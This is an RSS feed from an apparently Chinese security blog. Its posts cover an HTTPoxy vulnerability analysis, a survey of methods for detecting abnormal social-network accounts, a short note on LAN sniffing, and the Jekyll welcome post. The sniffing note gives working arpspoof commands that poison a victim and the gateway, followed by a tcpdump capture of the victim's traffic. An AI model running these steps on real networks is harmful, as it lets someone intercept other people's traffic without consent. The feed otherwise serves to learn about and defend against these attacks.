<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>INVOKER</title>
    <description>Write an awesome description for your new site here. You can edit this line in _config.yml. It will appear in your document head meta (for Google search results) and in your feed.xml site description.
</description>
    <link>http://localhost:4000/</link>
    <atom:link href="http://localhost:4000/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Tue, 13 Jun 2017 16:52:47 +0800</pubDate>
    <lastBuildDate>Tue, 13 Jun 2017 16:52:47 +0800</lastBuildDate>
    <generator>Jekyll v3.4.3</generator>
    
      <item>
        <title>HTTPOXY漏洞分析及Fastcgi与phpfpm之间的关系</title>
        <description>&lt;p&gt;落笔前两三天红帽官网报出一个http协议实现的漏洞，影响到绝大部分主流的cgi模式的http server端程序。简单的说，在http header中设置一个”proxy: 1.2.3.4”这样的请求头，就可以控制cgi模式下的环境变量HTTP_PROXY。&lt;/p&gt;

&lt;p&gt;然而，由于对cgi模式不了解，对php的运行的原理也不熟悉，直到按照文档的说明排查了公司代码，都对这个漏洞处于半懵逼状态。今天有空把鸟哥的文章研究了一下，顺便把cgi也搞懂了，简单留个笔记。&lt;/p&gt;

&lt;p&gt;首先，祭出鸟哥的文章：&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;http://www.laruence.com/2016/07/19/3101.html&quot;&gt;HTTPOXY漏洞说明&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;在这篇文章中，鸟哥解释了为什么会在协议实现的过程中留下这类问题。当然，是否属实都只是猜测，无法证实。&lt;/p&gt;

&lt;p&gt;为了测试，我部署了一个php环境，并写了测试代码，用nginx假设了正向代理：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?

var_dump(getenv(&quot;HTTP_PROXY&quot;));

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;对于鸟哥给出的例子，我不理解。因为在部署了测试代码以后，我发现当我执行了一下命令以后，无法用getenv(“HTTP_PROXY”)在服务器端获取到http_proxy这个变量的值。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http_proxy=127.0.0.1:8088 wget http://localhost/ff.php
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;而，当我使用curl命令，并在请求头部加上proxy字段的时候，就能获取。这是必须的。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -x 127.0.0.1:8088 http://localhost/ff.php -H 'proxy: test string'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这里使用代理，是为了在懵逼状态下测试getenv函数取到的代理地址是否是我使用的代理地址。（实际上在测试中我使用了私网地址。）&lt;/p&gt;

&lt;p&gt;于是我发现，只有http header中的proxy字段可以影响getenv这个函数获取的变量，其他，无论wget命令前进行的环境变量设置，还是使用http代理匀不会产生影响。&lt;/p&gt;

&lt;p&gt;那么wget命令前设置的环境变量，和getenv取得的环境变量，究竟是什么？&lt;/p&gt;

&lt;p&gt;为了验证这个问题，我对wget发出的请求进行了抓包（sudo tcpdump -A  -i lo），抓包发现，wget设置的变量（如我猜测）是真实的代理，这个请求首先通过连接到代理服务器（端口）的socket连接发给代理服务器，然后再转发给服务器。那么这个设置就是本地的代理环境变量。&lt;/p&gt;

&lt;p&gt;于是，百思不得其解。&lt;/p&gt;

&lt;p&gt;突然，一个念头蹦出来，是不是getenv获取到的变量，也像wget使用的这个变量。好吧，如果你已经猜到了结果，那么确实是这样的。&lt;/p&gt;

&lt;p&gt;我们还是来验证一下。还是使用刚才那段php代码（server端的），然后执行命令：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[root@vm-bl001.vm.momo.com html]# HTTP_PROXY='1231412' php ff.php

string(7) &quot;1231412&quot;

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;果然是这样。有些文档称造成这个漏洞的原因是命名空间冲突。其实除了这个原因，cgi对proxy这个字符串做过处理，是造成这个问题的最主要原因。如果开发同学本来想使用系统的环境变量来为自己的代码设置http请求代理，那么攻击者就有可能利用这里的逻辑去劫持和篡改请求。至于为什么不在代码中设置环境变量，我只能说研发同学的心思实在摸不透……&lt;/p&gt;

&lt;p&gt;另附sg上关于cgi的说明一篇，终于讲明白了。&lt;/p&gt;

&lt;p&gt;FROM:&lt;a href=&quot;https://segmentfault.com/q/1010000000256516&quot;&gt;搞不清FastCgi与PHP-fpm之间是个什么样的关系&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 21 Jul 2016 17:46:26 +0800</pubDate>
        <link>http://localhost:4000/%E5%8E%9F%E5%88%9B/2016/07/21/the-relationship-between-Fastcgi-and-phpfpm-and-HTTPOXY-analyze.html</link>
        <guid isPermaLink="true">http://localhost:4000/%E5%8E%9F%E5%88%9B/2016/07/21/the-relationship-between-Fastcgi-and-phpfpm-and-HTTPOXY-analyze.html</guid>
        
        
        <category>原创</category>
        
      </item>
    
      <item>
        <title>账号安全的异常检测</title>
        <description>&lt;h2 id=&quot;摘要&quot;&gt;摘要&lt;/h2&gt;

&lt;p&gt;这篇文章收集了一些学术界和著名的社交网络公司在针对异常账号的识别和检测的研究成果，总结了常见的几种算法，并对比其优劣。希望能在这篇文章的基础上，针对陌陌的实际情况，和大家共同探讨出一套可行的工程实践方案，解决账号安全这个“老大难”问题。&lt;/p&gt;

&lt;h2 id=&quot;0x00-引言&quot;&gt;0x00 引言&lt;/h2&gt;

&lt;p&gt;在线社交网络（Online Social Networks, OSN）也称为社会媒体网络（Social Media Networks，SMN）或社交网站（Social Network Sites，SNS），它是Web2.0时代的产物。社交网络出现，给人们的生活增添了许多新的方式。社交网络具有用户规模大、响应速度快的特点，而这些社交网络与生俱来的优势，也成为不法分子谋取利益的温床：他们会通过注册僵尸账号，或者盗用正常用户的帐号，在社交网站中发布广告、色情、钓鱼等恶意信息 ，通过不法交易或者诈骗等行为获得经济利益；也有一部分极端分子，利用社交网络扩散虚假、煽动性甚至恐怖信息。这些因素都会对在线社交网络的信誉评价体系以及用户的信任关系产生严重危害。&lt;/p&gt;

&lt;p&gt;总体而言，异常帐号检测主要涉及3方面的内容：&lt;/p&gt;

&lt;p&gt;（1）异常帐号的表现。&lt;/p&gt;

&lt;p&gt;（2）检测方案的设计。&lt;/p&gt;

&lt;p&gt;（3）检测方案的验证。&lt;/p&gt;

&lt;h2 id=&quot;0x01-异常账号的表现&quot;&gt;0x01 异常账号的表现&lt;/h2&gt;

&lt;p&gt;社交网络是近些年非常热门的一类互联网应用，它具有用户规模大、产品形态丰富的特点，因此，不同的类型的社交产品账号具有形态各异的表现。此外，帐号的表现是一个变化的过程，在用户使用账号的不同阶段，其表现会有差异。账号异常检测的目标，就是选取合适的维度，将正常的账号和异常账号的表现区分开。&lt;/p&gt;

&lt;p&gt;在过去的实践中，我们往往通过观察正常账号和异常账号的行为特征的差异来区分这两者。例如，正常账号通常来自一个IP地址，而这个IP地址也只能登录一个或者极少数几个账号，但是对于异常账号的控制者而言，他们会用一个IP去登录很多账号；再比如，一个正常用户的账号访问服务器的时间分布是随机的，并且平均频率低于1次/秒，但是异常账号会在一秒内发出多次请求，对于某些特定的应用接口，访问的时间间隔高度接近。通过对这些规律的总结和归纳，我们可以开发出一些方法对攻击者进行防御，但是越是明显的特征往往也越容易被绕过——也就是说，这样的方法的鲁棒性较弱。&lt;/p&gt;

&lt;p&gt;今年来，不少学术界和工业界的科学家和工程师运用数据科学的知识探索出一些新的方法，这些方法利用数据挖掘算法将数据中一些隐蔽的规律特征——甚至是无法用语言描述的特征——发现出来。在这个方向上，对于异常账号检测的方法论正在逐渐形成。&lt;/p&gt;

&lt;p&gt;其实，账号异常检测会运用到许多领域的研究成果，例如异常检测、基于图的异常检测、垃圾信息检测等。一些文章将检测方案归纳为为基于行为特征、基于内容、基于图以及无监督学习。由于涉及的技术多样切复杂，我们这里不对所有的方案进行讨论。&lt;/p&gt;

&lt;h2 id=&quot;0x02-异常账号的分类&quot;&gt;0x02 异常账号的分类&lt;/h2&gt;

&lt;p&gt;异常账号是描述一类行为异常的账号的统称。实际上，异常账号这个概念在不同的角度会有不同的表述。按照异常账号表现形式的不同，我们可以将其划分为以下几个类别：&lt;/p&gt;

&lt;p&gt;(1） 僵尸帐号(Social Bot），即由攻击者通过自动化工具创建的虚假帐号，能够模拟正常用户的操作如发布消息、添加好友等。&lt;/p&gt;

&lt;p&gt;(2） Sybil/Spam 帐号，指攻击者创建的用于隐蔽攻击的虚假身份账号。帐号主要用来发布广告、钓鱼、色情等信息，或用来恶意改变社交网络中的信誉，如恶意互粉、添加好友、点赞等行为。Spam账号是Sybil账号在应用阶段的统称。&lt;/p&gt;

&lt;p&gt;(3） Compromised帐号，即被劫持帐号。这些帐号原本是正常帐号，但被攻击者劫持来执行恶意行为。&lt;/p&gt;

&lt;p&gt;不同类别的账号所应用的检测方法也有差别，例如针对Spam帐号的检测主要侧重于恶意行为和恶意内容的特征，而针对 Compromised 帐号的检测主要利用帐号行为的突变来进行。基于这个原因，我们必须提一下Spam Campaign这种类型，它操纵大量虚假帐号以及盗用的Compromised帐号在集中时间段来传播恶意信息或执行其他恶意行为，称其为 SpamCampaign，这种类型的账号 可能包含僵尸账号、spam账号以及被劫持的账号等。针对这一类账号的检测主要通过这些帐号在同一时间段内的群体行为，如同时发布相同消息或者同时点赞某个页面等。&lt;/p&gt;

&lt;p&gt;这几类帐号的分类不是绝对的也不是互相排斥的，只是为了更好的标识异常帐号在不同阶段的不同表现。&lt;/p&gt;

&lt;h2 id=&quot;0x03-检测方法的分类&quot;&gt;0x03 检测方法的分类&lt;/h2&gt;

&lt;p&gt;这些年针对在线社交网络异常账号检测在学术界和工业界提出了大量的方案。根据国内研究者的总结，这些方法大概可以被归纳为4个类型：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;基于行为特征&lt;/li&gt;
  &lt;li&gt;基于内容&lt;/li&gt;
  &lt;li&gt;基于图&lt;/li&gt;
  &lt;li&gt;无监督学习&lt;/li&gt;
&lt;/ul&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;分类&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;思想&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;特征&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;方法&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;基于行为特征&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;分类&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;用户行为特征&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;有监督&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;基于内容&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;分类&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;消息内容&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;有监督&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;基于图&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;图中的异常检测&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;图结构&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;无监督&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;无监督学习&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;聚类/模型&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;multi&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;无监督&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h5 id=&quot;1基于行为特征&quot;&gt;1.基于行为特征&lt;/h5&gt;

&lt;p&gt;异常账号的目的是通过恶意行为获得经济利益，为了追求更高的回报，总会设法提高各类恶意操作的频率。异常账号的某些行为特征与正常的账号之间必然会有分别。基于行为特征的检测方案，可以看做数据挖掘中的分类问题——也就是说，检测者需要收集各种各样的行为特征，这些特征具备区分正常用户和异常用户的属性，通过选择某一特定的特征，将这个特征下采集到的数据样本分类，从而筛选出异常的账号。有时候一个特征就可以满足这个需求，而有时候需要多个特征结合起来才能形成区分度。&lt;/p&gt;

&lt;p&gt;前面提到过，选取不同的特征可以检测不同类型的异常账号。比如提提取账号注册的时间、ip分布、注册时的手机号可以检测僵尸账号，利用消息发布的频率、评论数、相似度等可以用来检测spam账号。下表引用了张玉清教授等人总结的特征的类型。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;类别&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;特征&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;用户个人信息&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;用户名长度、用户简介长度、帐号注册时间、用户名命名规则、被访问次数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;用户行为&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;消息发布时间间隔、评论回复时间、帐号注册流程、帐号点击顺序、点赞数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;好友关系&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;好友数、粉丝数、关注数、好友请求/好友数、关注数/粉丝数、好友网络聚类系数、二阶好友数、二阶好友消息数&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;消息内容&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;消息中 URL 比率、#比率、@比率、消息相似度、消息单词数、消息字符数、评论数、Spam 关键词数、消息来源、消息数量、消息转发次数&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;根据相关研究的统计结论，基于行为特征的检测方法，选取特征的重要性比选择算法更重要。不同的特征对检测结果的贡献度有所不同。另外，行为特征的选取，除特征的有效性（贡献度）要高以外，鲁棒性也应当尽可能强。攻击者通过辨别防御者的策略会及时更改绕过策略，而鲁棒性强特征使攻击者不易发现。另外，通过采用在线学习的办法可以及时更新模型，即使攻击者改变行为方式也能实时自动化训练模型。&lt;/p&gt;

&lt;h5 id=&quot;2基于内容的检测&quot;&gt;2.基于内容的检测&lt;/h5&gt;

&lt;p&gt;异常账号发布的消息异于常人，否则与正常账号没有分别。根据工作实践的观察，我们遇到的最常见的是通过招呼、留言等方式发送招嫖信息给男性用户。那么检测消息中是否含有恶意内容，就可以发现这部分异常账号。&lt;/p&gt;

&lt;p&gt;通过检测消息内容中被标记为恶意URL来识别实施钓鱼攻击的恶意账户，通过消息特征的突变来检测通过撞库等手段劫持的账号：通过时间、消息来源、消息语言、消息主题、消息中的链接、直接用户交互、邻近行等7个维度来建模，然后判断某一时间点之后的的消息是否与这个模型有所偏离来判定被盗的概率。&lt;/p&gt;

&lt;p&gt;此外，攻击者会扩大消息的传播范围以扩大收益，而这些消息往往具有极高的相似性。一项针对Twitter的统计表明，约63%的消息是基于模板产生。他们根据这一特性设计了Tangram，将已知的恶意消息分割来生成匹配模板，然后用模板去检测更多的恶意消息。另一条可行的思路是将用户发送的消息进行聚类，找到发布大量相似消息的群组，如果这些消息被判定为恶意消息，则认为发布消息的账号属于恶意账户。这种方法已经在Facebook和Twitter得到运用。&lt;/p&gt;

&lt;p&gt;然而，基于内容的检测与基于行为特征的检测一样，是有监督学习的方法。攻击者可以通过反复变化消息内容以达到绕过检测框架的目的。&lt;/p&gt;

&lt;h5 id=&quot;3基于图的检测&quot;&gt;3.基于图的检测&lt;/h5&gt;

&lt;p&gt;在一个社交网络中，异常账号的社交关系——即它与其他账号的连接形态和结构——会与正常账号有所不同，这是因为异常账号的关系网络往往服务于牟利的目的，它的分布有异于正常用户关系网随机分散的特点。如果想模仿正常用户构建异常用户的关系网络，那么攻击者就必须花费大量成本。基于图的检测方案的本质是异常帐号与正常帐号在组成的图中具有不同的结构或者连接方式，因此基于图的检测方案关键是构造一个图，在图中异常帐号与正常帐号具有不同的结构或者连接方式，然后利用图挖掘的相关算法找到图中具体的异常结构或者异常节点。&lt;/p&gt;

&lt;p&gt;在社交网络图中，正常账号和异常账号分别形成较密集的结构，而正常账号和异常账号之间存在稀疏的连接。目前利用图计算的异常挖掘检测方案主要有随机游走、社区发现以及其他特定业务场景下设计的方案。利用随机游走算法，通过计算节点与已知的正常节点之间的关系来判断帐号是否为异常，例如，通过随机游走算法选取一部分节点作为根节点，然后进行广度优先搜索，如果一个节点被搜索到的次数大于一个阈值，那么就判定为正常节点，否则为Sybil/Spam 节点。一些研究者认为基于随机游走算法的Sybil/Spam检测方案对于网络结构和攻击模型的假设在现实网络中并不成立。现实网络结构中正常节点并不是快速融合的而是形成多个社区结构，社区内是紧密联系而社区间存在稀疏的割边，而且攻击者创建的Sybil/Spam节点能够与其他正常节点建立大量的连接，因此利用随机游走算法的方案存在较大的误检率。因此将随机游走检测方案改进，由区分正常节点与 Sybil节点转变为判断正常节点所在社区内其他节点的正常概率，实验表明这种方案更有优势。&lt;/p&gt;

&lt;p&gt;此外，社交网络中除了显性的好友关系图，还存在大量利用其他关系（如好友请求、点赞、分享和转发等关系）组成的隐性关系图。一些工作利用隐性关系组成的图来检测异常帐号。&lt;/p&gt;

&lt;h5 id=&quot;4无监督学习的检测&quot;&gt;4.无监督学习的检测&lt;/h5&gt;

&lt;p&gt;基于行为特征和基于内容的检测方案都是有监督学习的方案，对分类器的训练需要提前对帐号状态进行标记，样本的数量与质量对于检测结果有较大的影响；基于图的检测方案尽管是无监督学习的，但是需要构建图结构。无监督学习的检测方案不需要提前对数据进行标记，因此能够更快的形成检测系统。根据具体的算法我们将方案分为两类：基于聚类和基于模型。&lt;/p&gt;

&lt;p&gt;基于聚类的方案本质上也是一个数据挖掘的聚类问题。通过对帐号的某些特征进行聚类，将正常或者异常的账号聚位一类或几类，然后抽样检验，如果发现一类中正常或异常的比例超过某一阈值，就判定该类为非一个正常或者异常集。基于聚类的检测方案的关键是选择合适的特征对帐号进行聚类。一项针对twitter的研究使用了用户个人信息和消息内容进行聚类，而另一项试验使用了http请求的时间序列特征进行了聚类。这里需要提到一点，基于聚类的方法和前文所述的基于特征的检测方法是有差别的，因为基于特征的方法是一个分类问题，而分类问题需要事先对数据进行标记，然后选择不同的分类算法对数据进行分类。而聚类方法，只选择一些特征（维度），从中挖掘数据之间的共性和差异，以此将数据划分为若干个集合。&lt;/p&gt;

&lt;p&gt;基于模型的方案的前提条件是认为正常用户的行为符合某种模型。因此，基于模型的特征要求使用大量正常账号进行训练形成模型，然后使用模型去识别异常的账号。腾讯的工程师在这个方向上的研究工作归纳出定义异常行为的两个指标：（1）同步值，即社交网络中异常帐号经常具有相同的行为；（2）异常值，即这些帐号的行为与大部分其他帐号的行为不同。通过计算这两个值，对于低于阈值的帐号判断为异常帐号。无监督学习的检测方案是目前异常帐号检测的新方向。无监督学习方案不需要提前对样本进行标识，因此能够检测到未知的恶意行为。&lt;/p&gt;

&lt;p&gt;分类，是按照一些标准和规则，将样本打对应的标签，根据标签分类。聚类，是开始时没有标签，只能通过某种共性，找出对象之间存在的共性。聚类前不知道要划分成几个组，什么组，也不知道根据哪些规则来定义组。&lt;/p&gt;

&lt;h2 id=&quot;0x04-小结&quot;&gt;0x04 小结&lt;/h2&gt;

&lt;p&gt;基于行为特征和基于内容的检测方案是有监督学习方案，优点是只要训练形成了分类器，就能够对异常帐号进行检测而且能够区分不同类别的异常帐号，检测准确率较高，但需要提前对样本数据进行标记，只能够检测已知的攻击类型，容易被攻击者绕过。基于内容的检测方案能够做到对异常帐号实时检测，但是只能够检测发布恶意消息的异常帐号。基于行为特征和基于内容的检测方案目前比较成熟，不单有理论的研究还有现实中大规模的部署。基于图的检测方案利用了图结构特征，抗扰动能力强，但是需要建立相应的图结构，检测的精度也较低，目前处于理论研究阶段，还没有形成大规模部署的经验。无监督学习方案不需要提前对样本数据进行标记，能够较快形成检测系统，同时能够检测未知的攻击行为，且不易被攻击者绕过，但是这种检测方案不容易区分不同类型的异常帐号，而且需要对大量数据进行学习。因此可以结合多种不同的检测方案，从不同的层次对异常帐号进行检测，如可以先采用无监督学习的方案检测未知的攻击行为，然后对攻击行为抽取特征，再利用有监督学习的方案进行检测。&lt;/p&gt;

</description>
        <pubDate>Thu, 14 Apr 2016 16:06:26 +0800</pubDate>
        <link>http://localhost:4000/%E5%8E%9F%E5%88%9B/2016/04/14/account-secure-abnormality-detection.html</link>
        <guid isPermaLink="true">http://localhost:4000/%E5%8E%9F%E5%88%9B/2016/04/14/account-secure-abnormality-detection.html</guid>
        
        
        <category>原创</category>
        
      </item>
    
      <item>
        <title>内网嗅探与tcpdump监听命令</title>
        <description>&lt;p&gt;参考：http://goodbai.com/secure/WhyLANSoInsecure.html&lt;/p&gt;

&lt;p&gt;1.安装arpspoof，使用route命令发现网关。通常default一行的gateway字段是网关的地址，但是如果是多级网关的话，就必须要找到对应的网卡（子域）。&lt;/p&gt;

&lt;p&gt;2.将victim机流量指向本地&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#告诉victim我是网关
sudo arpspoof -i eth0 -t [victim机IP] [网关IP]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;3.转发victim流量到网关&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#告诉网关我是victim
sudo arpspoof -i eth0 -t [网关IP] [victim机IP] 
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;4.获取监听的流量&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo tcpdump -vv -X -i eth0 'host [victim的IP]'
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;成功监听（窃听）到内网流量&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/56deb57f92a47.png&quot; alt=&quot;56deb57f92a47.png&quot; /&gt;&lt;/p&gt;
</description>
        <pubDate>Tue, 08 Mar 2016 21:06:26 +0800</pubDate>
        <link>http://localhost:4000/note/2016/03/08/%E5%86%85%E7%BD%91%E5%97%85%E6%8E%A2%E4%B8%8Etcpdump%E7%9B%91%E5%90%AC%E5%91%BD%E4%BB%A4.html</link>
        <guid isPermaLink="true">http://localhost:4000/note/2016/03/08/%E5%86%85%E7%BD%91%E5%97%85%E6%8E%A2%E4%B8%8Etcpdump%E7%9B%91%E5%90%AC%E5%91%BD%E4%BB%A4.html</guid>
        
        
        <category>note</category>
        
      </item>
    
      <item>
        <title>Welcome to Jekyll!</title>
        <description>&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;

&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;

&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;

&lt;!--description--&gt;

&lt;p&gt;You’ll find this post in your &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run &lt;code class=&quot;highlighter-rouge&quot;&gt;jekyll serve&lt;/code&gt;, which launches a web server and auto-regenerates your site when a file is updated.&lt;/p&gt;

&lt;p&gt;To add new posts, simply add a file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;_posts&lt;/code&gt; directory that follows the convention &lt;code class=&quot;highlighter-rouge&quot;&gt;YYYY-MM-DD-name-of-post.ext&lt;/code&gt; and includes the necessary front matter. Take a look at the source for this post to get an idea about how it works.&lt;/p&gt;

&lt;p&gt;Jekyll also offers powerful support for code snippets:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;nb&quot;&gt;puts&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Hi, &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;#{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;end&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;print_hi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Tom'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#=&amp;gt; prints 'Hi, Tom' to STDOUT.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Check out the &lt;a href=&quot;http://jekyllrb.com/docs/home&quot;&gt;Jekyll docs&lt;/a&gt; for more info on how to get the most out of Jekyll. File all bugs/feature requests at &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;Jekyll’s GitHub repo&lt;/a&gt;. If you have questions, you can ask them on &lt;a href=&quot;https://talk.jekyllrb.com/&quot;&gt;Jekyll Talk&lt;/a&gt;.&lt;/p&gt;

</description>
        <pubDate>Tue, 19 Jan 2016 21:06:26 +0800</pubDate>
        <link>http://localhost:4000/jekyll/2016/01/19/welcome-to-jekyll.html</link>
        <guid isPermaLink="true">http://localhost:4000/jekyll/2016/01/19/welcome-to-jekyll.html</guid>
        
        
        <category>jekyll</category>
        
      </item>
    
  </channel>
</rss>
